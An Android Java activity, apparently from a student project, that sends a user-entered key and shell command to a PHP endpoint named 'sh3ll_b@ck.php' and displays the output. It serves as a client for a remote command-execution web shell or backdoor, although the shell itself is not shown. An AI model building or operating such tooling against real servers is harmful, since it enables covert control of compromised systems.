package com.example.final_project;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class ShellActivity extends AppCompatActivity {
    private EditText editText1,editText2;
    private Button button1,button2;
    private TextView textView1;
	s_use temp = new s_use();
    final String URL = temp.getURL() + "sh3ll_b@ck.php";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_shell);
        initView();
        initListener();
    }

    public void initView(){
        editText1=findViewById(R.id.key);
        editText2=findViewById(R.id.command);
        button1=findViewById(R.id.btn_exec);
        button2=findViewById(R.id.btn_exit);
        textView1=findViewById(R.id.result);
        textView1.setText("");
    }
    public void initListener(){
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String key = editText1.getText().toString();
                String command = editText2.getText().toString();
                if (TextUtils.isEmpty(key)) {
                    Toast.makeText(ShellActivity.this, "密钥不能为空", Toast.LENGTH_SHORT).show();
                } else if (TextUtils.isEmpty(command)) {
                    Toast.makeText(ShellActivity.this, "命令不能为空", Toast.LENGTH_SHORT).show();
                } else {
                    OkHttpClient client=new OkHttpClient.Builder().build();
                    RequestBody post=new FormBody.Builder()
                            .add("key",key)
                            .add("command",command)
                            .build();
                    final Request request =new Request.Builder()
                            .url(URL)
                            .post(post)
                            .build();
                    client.newCall(request).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(okhttp3.Call call, IOException e) {

                        }
                        @Override
                        public void onResponse(okhttp3.Call call, final okhttp3.Response response) throws IOException {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        String temp=response.body().string();
                                        Log.v("run :",temp);
                                        temp=temp.replaceAll("\n", "");
                                        textView1.setText(temp);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                        }
                    });
                }

            }
        });
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                finish();
            }
        });
    }
}
